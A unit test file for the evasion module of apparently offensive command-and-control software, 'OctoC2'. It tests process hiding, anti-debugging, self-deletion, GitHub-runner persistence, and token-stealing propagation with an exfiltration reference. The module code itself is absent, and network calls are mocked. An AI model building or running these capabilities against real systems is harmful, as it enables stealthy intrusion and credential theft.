/**
 * OctoC2 — OpenHulud evasion module unit tests
 *
 * Verifies that all primitives resolve without throwing and return the correct
 * types. Platform-specific behaviour (e.g. /proc writes) is not asserted so
 * tests pass on any OS.
 */

import { describe, it, expect } from "bun:test";
import {
  getEvasionState,
  hideProcess,
  antiDebug,
  jitteredSleep,
  selfDelete,
  installPersistence,
  propagate,
} from "../evasion/OpenHulud.ts";

describe("getEvasionState", () => {
  it("returns the correct initial shape", () => {
    const s = getEvasionState();
    expect(typeof s.hidden).toBe("boolean");
    expect(typeof s.debugDetected).toBe("boolean");
    expect(typeof s.selfDeleted).toBe("boolean");
  });
});

describe("jitteredSleep", () => {
  it("resolves within ~150ms for 100ms base, 0 jitter", async () => {
    const start = Date.now();
    await jitteredSleep(100, 0);
    const elapsed = Date.now() - start;
    expect(elapsed).toBeGreaterThanOrEqual(90);
    expect(elapsed).toBeLessThan(300);
  });
});

describe("antiDebug", () => {
  it("returns a boolean without throwing", async () => {
    const result = await antiDebug();
    expect(typeof result).toBe("boolean");
  });
});

describe("hideProcess", () => {
  it("returns a non-empty string without throwing", async () => {
    const result = await hideProcess();
    expect(typeof result).toBe("string");
    expect(result.length).toBeGreaterThan(0);
  });
});

describe("selfDelete", () => {
  it("returns a non-empty string without throwing (even if unlink fails)", async () => {
    const result = await selfDelete();
    expect(typeof result).toBe("string");
    expect(result.length).toBeGreaterThan(0);
  });

  it("prefers argv[1] over execPath to avoid deleting the runtime interpreter", async () => {
    const origArgv1 = process.argv[1];
    process.argv[1] = "/tmp/fake-beacon-script";
    const result = await selfDelete();
    // Should reference argv[1] in the result message
    expect(result).toContain("fake-beacon-script");
    process.argv[1] = origArgv1 as string;
  });
});

describe("propagate", () => {
  it("returns dry-run result when token is empty", async () => {
    const result = await propagate("", "owner", "repo");
    expect(result.exfilRef).toBe("dry-run");
    expect(result.tokensFound).toBe(0);
  });

  it("returns a PropagateResult shape", async () => {
    const origFetch = globalThis.fetch;
    (globalThis as any).fetch = async () => ({ ok: false, status: 403, json: async () => ({}) });
    const result = await propagate("ghp_fake", "testowner", "testrepo");
    (globalThis as any).fetch = origFetch;
    expect(typeof result.tokensFound).toBe("number");
    expect(typeof result.exfilRef).toBe("string");
    expect(Array.isArray(result.techniques)).toBe(true);
  });
});

describe("installPersistence", () => {
  it("gh-runner returns PersistenceResult", async () => {
    const origFetch = globalThis.fetch;
    (globalThis as any).fetch = async () => ({ ok: false, status: 403 });
    const result = await installPersistence("gh-runner");
    (globalThis as any).fetch = origFetch;
    expect(typeof result.method).toBe("string");
    expect(typeof result.success).toBe("boolean");
    expect(typeof result.detail).toBe("string");
  });

  it("gh-runner-register is an alias for gh-runner", async () => {
    const origFetch = globalThis.fetch;
    (globalThis as any).fetch = async () => ({ ok: false, status: 403 });
    const result = await installPersistence("gh-runner-register");
    (globalThis as any).fetch = origFetch;
    expect(result.method).toBe("gh-runner");
    expect(typeof result.success).toBe("boolean");
  });
});
